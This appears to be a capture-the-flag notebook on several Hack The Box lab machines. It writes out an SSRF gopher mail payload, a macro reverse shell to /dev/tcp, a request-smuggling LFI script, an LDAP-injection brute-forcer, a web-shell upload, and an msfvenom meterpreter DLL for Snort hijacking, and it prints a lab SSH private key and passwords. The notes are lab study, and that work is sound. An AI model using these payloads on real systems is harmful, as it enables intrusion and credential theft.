# Hard\_machines

### Gofer

[write-up](https://rouvin.gitbook.io/ibreakstuff/writeups/htb-season-2/gofer)

#### Reco

* NMAP
  * `nmap -sVC 10.10.11.225` ![](https://hackmd.io/\_uploads/SkEh6Mdi2.png)
    * 22 SSH
    * 25 filtered SMTP
    * 80 HTTP (redirect gofer.htb)
      * add it to our /etc/hosts
    * 139,445 SAMBA (smbd 4.6.2)
      * clock-skew -2s
      * security-mode 311 (signing enabled but not required)
* Website
  * "We are team of talented designers making websites with **BOOTSTRAP**"
    * BootstrapMade
  * images are stored in /assets/img/portfolio
  * contact form could have some weakness ![](https://hackmd.io/\_uploads/B1wqpMdih.png)

#### Weaponisation

* SMB
  * using nmap we found samba, lets scan it
    * `smbmap -H 10.10.11.225 -u " "` ![](https://hackmd.io/\_uploads/r1R21Qdjn.png)
      * we have "read only" permissions to disk **SHARES**
  * let´s look inside shares disk
    * `smbclient -N //10.10.11.225/shares` ![](https://hackmd.io/\_uploads/H1GPe7dsn.png)
  * analyze obtained backedup **email**
    * ![](https://hackmd.io/\_uploads/HJCFlXusn.png)
      * email addresses: jdavis@gofer.htb, tbuckley@gofer.htb
      * they are sending important documents internally by mail
        * using .odt format (Libreoffice, not Office Word)
      * there is a proxy
* Dir scan
  * `dirsearch -u http://gofer.htb/`
    * we can access gofer.htb/assets ![](https://hackmd.io/\_uploads/BJumDXOs2.png)
  * /assets
    * style.css, main.js
      * template Maxim v4.9.1
    * php-email-form/validate.js
      * PHP Email Form Validation v3.5 ![](https://hackmd.io/\_uploads/H1zvwm\_oh.png)
* Proxy
  * let´s find the proxy
    * `ffuf -w /usr/share/wordlists/wfuzz/general/common.txt -u "http://gofer.htb" -H "Host: FUZZ.gofer.htb" -fw 20`
      * **proxy.gofer.htb** -> add it to /etc/hosts ![](https://hackmd.io/\_uploads/H13NMXujn.png)

#### Exploitation

* **SSRF**
  * when accessing proxy.gofer.htb, there is a login pop-up window
    * Lets try the POST request for the index.php
      * `curl -X POST http://proxy.gofer.htb/index.php` ![](https://hackmd.io/\_uploads/Sy35nT9sn.png)
        * passed without credentials, but nothing more...
    * there could be a SSRF vuln
      * URL parameter can be specified like this:
        * `curl -X POST http://proxy.gofer.htb/index.php?url=http://<LOCAL_IP>`
      * now we can try /passwd path
        * `curl -X POST http://proxy.gofer.htb/index.php?url=file:///etc/passwd`
      * after a bit of testing and modifying...
        * `curl -X POST http://proxy.gofer.htb/index.php?url=file:/etc/passwd`
* We need to use an .odt format to exploit this, and it appears that this is from the user Jeff Davis from the company site (with a username of jdavis, so we know the username naming convention).
  * Since we have some kind of SSRF on the proxy service, we might be able to force a user to download and execute a malicious .odt file via macros to get the first shell. However, we first need to find out how to send an email through the proxy to the user since SMTP is not publicly facing.
  * Based on the box name alone, I sort of figured out that we need to use the gopher:// protocol, which is used to send files to other users.
* !!! **important knowledge**: [SSRF](https://infosecwriteups.com/server-side-request-forgery-to-internal-smtp-access-dea16fe37ed2?gi=50c9cd56d751) and [Gopherus payload](https://github.com/tarunkant/Gopherus) !!!
* OK: we want to use the **gopher** protocol to craft an ssrf payload based on the information in the email found on smb
  * right path to a foothold is in the obtained email
    * we can use the mentioned Gopherus for creating payload:
* **1. PAYLOAD:**
  * `curl -X POST "http://proxy.gofer.htb/index.php?url=gopher://2130706433:25/xHELO%250d%250aMAIL%20FROM%3A%3Ciamanidiot@gofer.htb%3E%250d%250aRCPT%20TO%3A%3Cjhudson@gofer.htb%3E%250d%250aDATA%250d%250aFrom%3A%20%3Ciamanidiot@gofer.htb%3E%250d%250aTo%3A%20%3Cjdavis@gofer.htb%3E%250d%250a%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250a<a+href%3d'http%3a//10.10.14.24/macro.odt>open</a>%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a"`
    * [.odt file HINT](https://jamesonhacking.blogspot.com/2022/03/using-malicious-libreoffice-calc-macros.html)
* **2. MACRO:**
  * prepare it by this [guide](https://jamesonhacking.blogspot.com/2022/03/using-malicious-libreoffice-calc-macros.html)

> Sub Main Shell("bash -c 'bash -i >& /dev/tcp/\<LOCAL\_IP>/\<LOCAL\_PORT> 0>&1'") End Sub

* **3. HTTP.SERVER && NC:**
  * `nc -nlvp <LOCAL_PORT>`
  * `python3 -m http.server 80` //in the folder containing macro.odt

#### User flag

#### Root flag

* Linpeas
  * lim8en1 (option #8)
  * 23+who

## Napper

### Reco

#### nmap

* 80 HTTP
  * redirect to app.napper.htb
    * sudo nano /etc/hosts
* 443 HTTPS
  * organizationName = MLopsHub (CA, USA)
  * http-generator = Hugo 0.112.3
  * http-methods => potentially risky methods: TRACE
* Host script results: clock-skew: -ls

#### dirb

### Weaponisation

* Website is running HUGO framework w older version
  * VULN: **CVE-2020-26284**

{% embed url="https://github.com/gohugoio/hugo/security/advisories/GHSA-8j34-9876-pvfq" %}

## Ouija

{% embed url="https://darkwing.moe/2023/12/05/Ouija-HackTheBox/" %}

$y$j9T$Kg/bsxGg3rtmr7d.HkQ0N/$14XejevAukcx9oDmYsXF967olH7um9buAQ3wSGdOCy8

### Reco

#### nmap

`nmap -sVC 10.10.11.244`

* 22 SSH
* 80 HTTP
  * Apache httpd 2.4.52
* 3000 HTTP
  * Node.js Express FW

#### website

*   default port 80

    * Apache2 Default Page

    <figure><img src=".gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>


*   port 3000

    * 200 not found, redirect to .

    <figure><img src=".gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>

    <figure><img src=".gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>



#### dir busting

* `gobuster dir -u http://10.10.11.244:80/ -w /usr/share/seclists/Discovery/Web-Content/common.txt`
  * /index.php => ouija.htb
    * add to hosts
      * `sudo nano /etc/hosts`

<figure><img src=".gitbook/assets/image (77).png" alt=""><figcaption></figcaption></figure>

* we accessed the website

<figure><img src=".gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

*   lets dir bust ouija.htb website...

    * gobuster dir -u http://ouija.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
      * /admin
      * /css /img /js /lib

    <figure><img src=".gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>


* access to subpages
  * /admin is forbidden
  * /css -> style.css -> Theme REGNA (bootstrap)
  * /js
  * /lib&#x20;
    * bootstrap v4.0.0 (copyright till 2018)
    * counterup.js v2.1.0 (copyright 2017)
    * easing v1.4.1 (2008)
    * migrate v3.0.0
    * menu Superfish v1.7.9 (2016)
    * hoverIntent v1.8.1
    * waypoints v4.0.1 (2016)
    * wow v1.3.0 (2016)
* source code of index.php
  * tracking script -> gitea.ouija.htb/leila/....
    * `src="`**`http://gitea.ouija.htb/leila/ouija-htb/js/tracking.js?_=0183747482`**`"`

<figure><img src=".gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>

### Weaponisation

* add gitea.ouija.htb to hosts...

<figure><img src=".gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>

* access gitea repo

<figure><img src=".gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>

* `git clone http://gitea.ouija.htb/leila/ouija-htb.git`
  * instructions:
    * Install HA-Proxy version 2.2.16
      * VULN
        * [CVE-2023-25725](https://www.cvedetails.com/cve/CVE-2023-25725/)
          * we can bypass access control because HTTP/1 headers are inadvertently lost in some situations (request smuggling)

<figure><img src=".gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>

* PoCs
  * alexOarga/CVE-2021-40346: CVE-2021-40346 - HaProxy HTTP request smuggling through integer overflow\
    [https://github.com/alexOarga/CVE-2021-40346](https://github.com/alexOarga/CVE-2021-40346)
  * HAProxy vulnerability enables HTTP request smuggling attacks | The Daily Swig\
    [https://portswigger.net/daily-swig/haproxy-vulnerability-enables-http-request-smuggling-attacks](https://portswigger.net/daily-swig/haproxy-vulnerability-enables-http-request-smuggling-attacks)
  * Critical vulnerability in HAProxy | JFrog Security Research Team\
    [https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/](https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/)
  * Client-Side Desync - PortSwigger - YouTube\
    [https://www.youtube.com/watch?v=6wVb6KSmras\&ab\_channel=Txhaka](https://www.youtube.com/watch?v=6wVb6KSmras\&ab\_channel=Txhaka)

### Exploitation

#### Content

<figure><img src=".gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

* init.sh
  * beginning of api config... (Front Jailor 3000 End)
    *

        <figure><img src=".gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>


* app.js
  * sub-base 64+16 ... identification header, sha256, ihash header...
    *

        <figure><img src=".gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>



#### LFI 1

<figure><img src=".gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>

* crafted python script for that...
  * lfi.py

| <pre><code>1
2
Three
Four
Five
6
7
8
9
Ten
11
12
13
14
15
16
17
18
19
20
twenty one
twenty two
twenty three
</code></pre> | <pre><code>from pwn import *
import socket
import sy
import re
import gzip 

if len (sys.argv) &#x3C; 2:
	print ("missing file param")
	sys.exit ()file = sys.argv[1]
	


cl = len ("GET http://dev.ouija.htb/editor.php?file=%s HTTP/1.1\r\nh:" % file)

payload = """POST / HTTP/1.1\r\nHost: ouija.htb\r\nContent-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n\r\n""" % (cl, file)

r = remote ('ouija.htb', 80)
r.send (bytes (payload, 'utf-8'))

response = r.recvrepeat (1).decode ('utf-8')

output = re.search (r'(?&#x3C;=\&#x3C;textarea name="content" id="content" cols="30" rows="10"\>) ([\s\S]*?) (?=\&#x3C;/textarea\>)', Response).group ()
print (output)
</code></pre> |
| ------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |

* output
  *

      <figure><img src=".gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>



#### extend the hash

* hash\_extender tool
  * `./hash_extender -d'bot1: bot' -s 4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1 -a': admin:True' -f sha2`
  * output:
    * New string
      * `626f74313a626f74800000000000000000000000000000000000000000000000000000000000000003a3a61646d69`
    * New signature
      * ```
        14be2f4a24f876a07a5570cc2567e18671b15e005ed92f10089533c1830c0b
        ```
    * Type: sha256
    * Secret length: 23

#### LFI 2

<figure><img src=".gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>

* .config/bin/process\_informations/self/root/etc/passwd&#x20;
* .config/bin/process\_informations/self/root/home/leila/.ssh/id\_rsa

<figure><img src=".gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

* **obtained ir\_rsa of user leila**
  * path of injection: ......./home/leila/.ssh/id\_rsa
    *

        ```
        -----BEGIN OPENSSH PRIVATE KEY-----
        b3BlbnNzaC1rZXktdjEAAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
        NhAAAAAwEAAQAAAYEAqdhNH4Q8tqf8bXamRpLkKKsPSgaVR1CzNR/P2WtdVz0Fsm5bAusP
        O4ef498wXZ4l17LQ0ZCwzVj7nPEp9Ls3AdTFZP7aZXUgwpWF7UV7MXP3oNJ0fj26ISyhdJ
        ZCTE/7Wie7lkk6iEtIa8O5eW2zrYDBZPHG0CWFk02NVWoGjoqpL0/kZ1tVtXhdVyd3Q0Tp
        miaGjCSJV6u1jMo/uucsixAb + vYUrwlWaYsvgW6kmr26YXGTShXRbqHBHtcDRv6EuarG5
        7SqKTvVD0hzSgMb7Ea4JABopTyLtQSioWsEzwz9CCkJZOvkU01tY/Vd1UJvDKB8TOU2PAi
        aDKaZNpDNhgHcUSFH4/1AIi5UaOrX8NyNYBirwmDhGovN/J1fhvinXts9FlzHKZINcJ99b
        KkPln3e5EwJnWKrnTDzL9ykPt2IyVrYz9QmZuEXu7zdgGPxOd+HoE3l+Px9/pp32kanWwT
        yuv06aVlpYqm9PrHsfGdyfsZ5OMG3htVo4/OXFrBAAAFgE/tOjBP7TowAAAAB3NzaC1yc2
        EAAAGBAKnYTR+ EPLan/G12pkaS5CirD0oGlUdQszUfz9lrXVc9BbJuWwLrDzuHn+PfMF2e
        Jdey0NGQsM1Y+5zxKfS7NwHUxWT+2mV1IMKVhe1FezFz96DSdH49uiEsoXSWQkxP+1onu5
        ZJOohLSGvDuXlts62AwWTxxtAlhZNNjVqBo6KqS9P5GdbVbV4XVcnd0NE6ZomhowkiVer
        tYzKP7rnLIsQG/r2FK8JVmmLL4FupJq9umFxmU0oV0W6hwR7XA0b+hLmqxue0qik71Q9Ic
        0oDG + xGuCQAaKU8i7UEoqFrBM8M/QgpCWTr5FNNbWP1XdVCbwygfEzlNjwImgymmTaQzYY
        B3FEhR+ P9QCIuVGjq1/DcjWAYq8Jg4RqLzfydX4b4p17bPRZcxymSDXCffWypD5Z93uRMC
        Z1iq50w8y/cpD7diMla2M/UJmbhF7u83YBj8Tnfh6BN5fj8ff6ad9pGp1sE8rr9OmlZaWK
        pvT6x7Hxncn7GeTjBt4bVaOPzlxawQAAAAMBAAEAAAGAEJ9YvPLmNkIulE/+af3KUqibMH
        WAeqBNSa+5WeAGHJmeSx49zgVPUlYtsdGQHDl0Hq4jfb8Zbp980JlRr9/6vDUktIO0wCU8
        dY7IsrYQHoDpBVZTjF9iLgj +LDjgeDODuAkXdNfp4Jtl45qQpYX9a0aQFThlG9xvLaGD
        fuOFkdwcGh6vOnacFD8VmtdGn0KuAGXwTcZDYr6IGKxzIEy/9hnagj0hWp3V5/4b0AYxya
        dxr1E/YUxIBC4o9oLOhF4lpm0FvBJQxLOG+lyEv6HYesX4txDBY7ep6H1Rz6R+fgVJPFx
        1LaYaNWAr7X4jlZfBhO5WIeuHW+yqba6j4z3qQGHaxj8c1+wOAANVMQcdHCTUvkKafh3oz
        4Cn58ZeMWq6vwk0vPdRknBn3lKwOYGrq2lp3DI2jslCh4aaehZ1Bf+/UuP6Fc4kbiCuNAR
        dM7lG35geafrfJPo9xfngr44I8XmhBCLgoFO4NfpBSjnKtNa2bY3Q3cQwKlzLpPvyBAAAA
        wErOledf + GklKdq8wBut0gNszHgny8rOb7mCIDkMHb3bboEQ6Wpi5M2rOTWnEO27oLyFi1
        hCAc+URcrZfU776hmswlYNDuchBWzNT2ruVuZvKHGP3K3/ezrPbnBaXhsqkadm2el5XauC
        MeaZmw/LK+0Prx/AkIys99Fh9nxxHcsuLxElgXjV+qKdukbT5/YZV/axD4KdUq0f8jWALy
        rym4F8nkKwVobEKdHoEmK/Z97Xf626zN7pOYx0gyA7jDh1WwAAAMEAw9wL4j0qE4OR5Vbl
        jlvlotvaeNFFUxhy86xctEWqi3kYVuZc7nSEz1DqrIRIvh1Anxsm/4qr4+P9AZZhntFKCe
        DWc8INjuYNQV0zIj/t1mblQUpEKWCRvS0vlaRlZvX7ZjCWF/84RBr/0Lt3t4wQp44q1eR0
        nRMaqbOcnSmGhvwWaMEL73CDIvzbPK7pf2OxsrCRle4BvnEsHAG/qlkOtVSSerio7Jm7c0
        L45zK + AcLkg48rg6Mk52AzzDetpNd5AAAAwQDd/1HsP1iVjGut2El2IBYhcmG1OH+1VsZY
        UKjA1Xgq8Z74E4vjXptwPumf5u7jWt8cs3JqAYN7ilsA2WymP7b6v7Wy69XmXYWh5RPco3
        ozaH3tatpblZ6YoYZI6Aqt9V8awM24ogLZCaD7J+zVMd6vkfSCVt1DHFdGlywLPr7tqx0b
        KsrdSY5mJ0d004Jk7FW+nIhxSTD3nHF4UmLtO7Ja9KBW9e7z+k+NHazAhIpqchwqIX3Io6
        DvfM2TbsfLo4kAAAALbGVpbGFAb3VpamE=
        -----END OPENSSH PRIVATE KEY-----
        ```

## Office

### Reco

#### nmap

`sudo nmap -sVC 10.10.11.3`

<figure><img src=".gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>

* obtained info
  * 53 DNS
  * 80 HTTP (Joomla) - /administrator /logs /plugins /installation
  * 88 Kerberos
  * 443 HTTPS
  * 445 Microsoft DS
  * 464 Kpasswd5?
  * 593 RPC over HTTP
  * 3268+3269 LDAP (AD) - office.htb0
* no etc hosts update needed

#### website

* blog written by "Tony Stark" about Iron Man series & Holograms
* /administrator
  * default Joomla credentials
    * admin:\<none>
    * joomla:secret
    * joomla2:secret
  * none of above working...
* **JOOMLA v4.2.7**&#x20;
  * CVE-2023-23752
    * improper access check allows unauth access to webservice endpoints...

### Weaponisation

#### Joomla Exploit

* find Exploit for CVE above and clone it
  * git clone [https://github.com/Acceis/exploit-CVE-2023-23752.git](https://github.com/Acceis/exploit-CVE-2023-23752.git)
  * cd exploit
  * ruby exploit.rb http://10.10.11.3
    * User: 474 Tony Stark (admin)
      * Administrator@holography.htb
      * Super Users
    * Editor: tinymce
    * DB info:
      * type: mysqli
      * name: joomla\_db
      * **root:H0lOgrams4reTakIng0Ver754!**

<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* OK, we obtained access to DB, but first we have to gain backend access...

#### Bruteforcing Kerberos

* tool: Kerbrute

```bash
git clone https://github.com/ropnop/kerbrute.git
cd kerbrute
make all
cd dist
./kerbrute_linux_amd64 userenum --dc 10.10.11.3 -d office.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

* obtained info:
  * usernames:
    * administrator@office.htb
    * ewhite@office.htb
    * etower@office.htb
    * dwolfe@office.htb
    * dlanor@office.htb
    * dmichael@office.htb

<figure><img src=".gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Exploitation

* i didnt know what to do next with obtained credentials...
* so I decided to try combinations for few login possibilities
  * SMB was working

#### smbclient

```bash
#login & list shares
smbclient -L //10.10.11.3 -U dwolfe@office.htb --password=H0lOgrams4reTakIng0Ver754!

#list specific share...
smbclient \\\\\10.10.11.3\\SYSVOL -U dwolfe@office.htb --password=H0lOgrams4reTakIng0Ver754!
ls
cd office.htb
ls
cd Policies

#cd to all the 7 subdirs and download each GPT.INI file
cd <folder>
get GPT.INI
```

<figure><img src=".gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>



* lets list these shares
  *

### User flag

### Root flag

## Analysis

### Reco

#### nmap

* nothing much than the expected ones on Windows machine

<figure><img src=".gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

#### website

* page with no subpages, no text, no versions...

<figure><img src=".gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### fuzzing

* some subpages found, but all of them are 403 (forbidden access)
* FFUF, DIRB
* did it one more time, found a subdomain
  * **internal**.analysis.htb

<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

#### kerbrute

* `./kerbrute_linux_amd64 userenum --dc analysis.htb -d analysis.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt`
* some usernames found, could be useful for Weaponisation

<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

* `nano usernames.txt`

<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

### Weaponisation

#### Internal fuzzing

* there is a internal.analysis.htb subdomain, lets fuzz it
  * `ffuf -w <wordlist> -u http"//internal.analysis.htb:80/FUZZ -mc 200,301,302`
    * /users
    * /dashboard
    * /employees

<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>



* lets try to find another PHP files under subpages
  * /users
    * /list

<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

* /dashboard
  * /index
  * /details
  * /emergency
  * /form
  * /logout
  * /tickets
  * /upload
* /employees
  * /login

<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

#### LDAP Injection

* we cant really read the content of subpages (LFI), but we can try to make it work via LDAP injection...
* What is it?
  * LDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input. When an application fails to properly sanitize user input, it’s possible to modify LDAP statements using a local proxy. This could result in the execution of arbitrary commands such as granting permissions to unauthorized queries, and content modification inside the LDAP tree. The same advanced exploitation techniques available in [SQL Injection](https://owasp.org/www-community/attacks/SQL\_Injection) can be similarly applied in LDAP Injection.
* [http://internal.analysis.htb/users/list.php?name=\*](http://internal.analysis.htb/users/list.php?name=\*)

<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

* OK, we obtained the username "technician"
  * lets obtain his PW to login
    * script for fuzzing LDAP description (PW)
      * `go run script.go`

```go
package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

func main() {
	// Prompt user for wordlist input
	fmt.Print("Enter the wordlist or charset (press Enter to use the default): ")
	scanner := bufio.NewScanner(os.Stdin)
	scanner.Scan()
	charsetPath := strings.TrimSpace(scanner.Text())

	// Use default wordlist if user didn't provide one
	if charsetPath == "" {
		charsetPath = "/usr/share/seclists/Fuzzing/alphanum-case-extra.txt"
	}

	baseURL := "http://internal.analysis.htb/users/list.php?name=*)(%26(objectClass=user)(description={found_char}{FUZZ}*)"
	foundChars := ""

	file, err := os.Open(charsetPath)
	if err != nil {
		fmt.Println("Error opening charset file:", err)
		return
	}
	defer file.Close()

	scanner = bufio.NewScanner(file)
	for scanner.Scan() {
		char := strings.TrimSpace(scanner.Text())
		//fmt.Println("Trying character:", char)
		//thisisthat := "OnlyWorkingInput:"
		
		modifiedURL := strings.Replace(baseURL, "{FUZZ}", char, 1)
		modifiedURL = strings.Replace(modifiedURL, "{found_char}", foundChars, 1)
		fmt.Println("Modified URL:", modifiedURL)
		//fmt.Println(thisisthat,"{found_char}",foundChars, 1)
		
		response, err := http.Get(modifiedURL)
		if err != nil {
			fmt.Println("Error making HTTP request:", err)
			return
		}
		defer response.Body.Close()

		body, err := ioutil.ReadAll(response.Body)
		if err != nil {
			fmt.Println("Error reading response body:", err)
			return
		}

		if strings.Contains(response.Status, "200 OK") && strings.Contains(string(body), "technician") {
			fmt.Println("Found character:", char)
			foundChars += char
			file.Seek(0, 0) // Move the file pointer to the beginning for another iteration
		}
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading charset file:", err)
		return
	}

	fmt.Println("Final found characters:", foundChars)
}
```

* interation goes into loop because of \* char

<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

* lets add the obtained string to the script and do the second iteration
  * `baseURL := "http://internal.analysis.htb/users/list.php?name=`_`)(%26(objectClass=user)(description=97NTtl`_`{found_char}{FUZZ}*)"`
* improved script.go:

```go
package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

func main() {
	// Prompt user for wordlist input
	fmt.Print("Enter the wordlist or charset (press Enter to use the default): ")
	scanner := bufio.NewScanner(os.Stdin)
	scanner.Scan()
	charsetPath := strings.TrimSpace(scanner.Text())

	// Use default wordlist if user didn't provide one
	if charsetPath == "" {
		charsetPath = "/usr/share/seclists/Fuzzing/alphanum-case-extra.txt"
	}

	baseURL := "http://internal.analysis.htb/users/list.php?name=)(%26(objectClass=user)(description=97NTtl{found_char}{FUZZ}*)"
	foundChars := ""

	file, err := os.Open(charsetPath)
	if err != nil {
		fmt.Println("Error opening charset file:", err)
		return
	}
	defer file.Close()

	scanner = bufio.NewScanner(file)
	for scanner.Scan() {
		char := strings.TrimSpace(scanner.Text())
		//fmt.Println("Trying character:", char)
		//thisisthat := "OnlyWorkingInput:"
		
		modifiedURL := strings.Replace(baseURL, "{FUZZ}", char, 1)
		modifiedURL = strings.Replace(modifiedURL, "{found_char}", foundChars, 1)
		fmt.Println("Modified URL:", modifiedURL)
		//fmt.Println(thisisthat,"{found_char}",foundChars, 1)
		
		response, err := http.Get(modifiedURL)
		if err != nil {
			fmt.Println("Error making HTTP request:", err)
			return
		}
		defer response.Body.Close()

		body, err := ioutil.ReadAll(response.Body)
		if err != nil {
			fmt.Println("Error reading response body:", err)
			return
		}

		if strings.Contains(response.Status, "200 OK") && strings.Contains(string(body), "technician") {
			fmt.Println("Found character:", char)
			foundChars += char
			file.Seek(0, 0) // Move the file pointer to the beginning for another iteration
		}
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading charset file:", err)
		return
	}

	fmt.Println("Final found characters:", foundChars)
}
```

* it finds our PW
  * **`97NTtl*4QP96Bv`**

<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

* Lets check if it is correct...
  * nano PW.txt
    * **`97NTtl*4QP96Bv`**
  * `./kerbrute_linux_amd64 bruteuser --dc analysis.htb -d analysis.htb PW.txt technician`

<figure><img src=".gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

*   Login into

    * technician@analysis.htb:97NTtl\*4QP96Bv

    <figure><img src=".gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

### Exploitation

#### Finding the Vector

* Tickets -> two unresolved issues
  * AD login issue via kerberos auth
  * failing to execute HTA files
* SOC Report
  * files can be uploaded
* Emergency
  * we can send data through notification form&#x20;

<figure><img src=".gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

#### Crafting php RS

* P0wnyshell
  * copy shell.php content
  * nano shell.php
    * upload it & go to /dashboard/uploads/shell.php

<figure><img src=".gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

* cd C:\inetpub\internal\users
* type list.php
  * we obtained:
    * $ldap\_password = 'N1G6G46G@G!j';
    * $ldap\_username = 'webservice@analysis.htb';
    * $ldap\_connection = ldap\_connect("analysis.htb");

<figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

* cd C:\inetpub\internal\employees
* type login.php
  * we obtained:
    * $host = "localhost";&#x20;
    * $username = "db\_master";&#x20;
    * $password = '0$TBO7H8s12yh&';&#x20;
    * $database = "employees";

<figure><img src=".gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

### User flag

#### jdoe password

* cd C:\Windows\temp
* `reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"`
  * **jdoe:7y4Z4^\*y9Zzj**

<figure><img src=".gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

#### evil-winrm login

* `evil-winrm -i 10.10.11.250 -u jdoe -p 7y4Z4^*y9Zzj`

<figure><img src=".gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

* `cd ..`
* `cd Desktop`
* `type user.txt`

<figure><img src=".gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

### Root flag

#### Snort

* There is a SW called Snort
  * Snort is the foremost Open Source Intrusion Prevention System (IPS) in the world. Snort IPS uses a series of rules that help define malicious network activity and uses those rules to find packets that match against them and generates alerts for users.
  * Snort can be deployed inline to stop these packets, as well. Snort has three primary uses: As a packet sniffer like tcpdump, as a packet logger — which is useful for network traffic debugging, or it can be used as a full-blown network intrusion prevention system. Snort can be downloaded and configured for personal and business use alike.
    * it has a vuln
      * we can hijack it for PE
        * &#x20;reference: [https://hyp3rlinx.altervista.org/advisories/SNORT-DLL-HIJACK.txt](https://hyp3rlinx.altervista.org/advisories/SNORT-DLL-HIJACK.txt)

<figure><img src=".gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

* `icacls snort_dynamicpreprocessor`

<figure><img src=".gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

#### Create a malicious .dll file

* `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=9001 -f dll -o sf_engine.dll`
  * we crafted malicious **sf\_engine.dll** file

<figure><img src=".gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

* msfconsole -q
  * search multi handler
  * use 5
  * options
  * set LHOST tun0
  * set LPORT 9001
  * run -j

<figure><img src=".gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

* Evil-winRM
  * cd snort\_dynamicpreprocessor
  * upload sf\_engine.dll

<figure><img src=".gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

* The next step is to start snort, so I've create an empty pcap-file in C:\private this might raise an error but as long the file exists it is fine. Could be possible to start snort without a file as well
  * cd private
  * type nul > test.pcap

<figure><img src=".gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

* now we should obtain the ADMIN shell in our msfconsole
  * shell
    * `cd Users/Administrator/Desktop`
    * `type root.txt`

<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
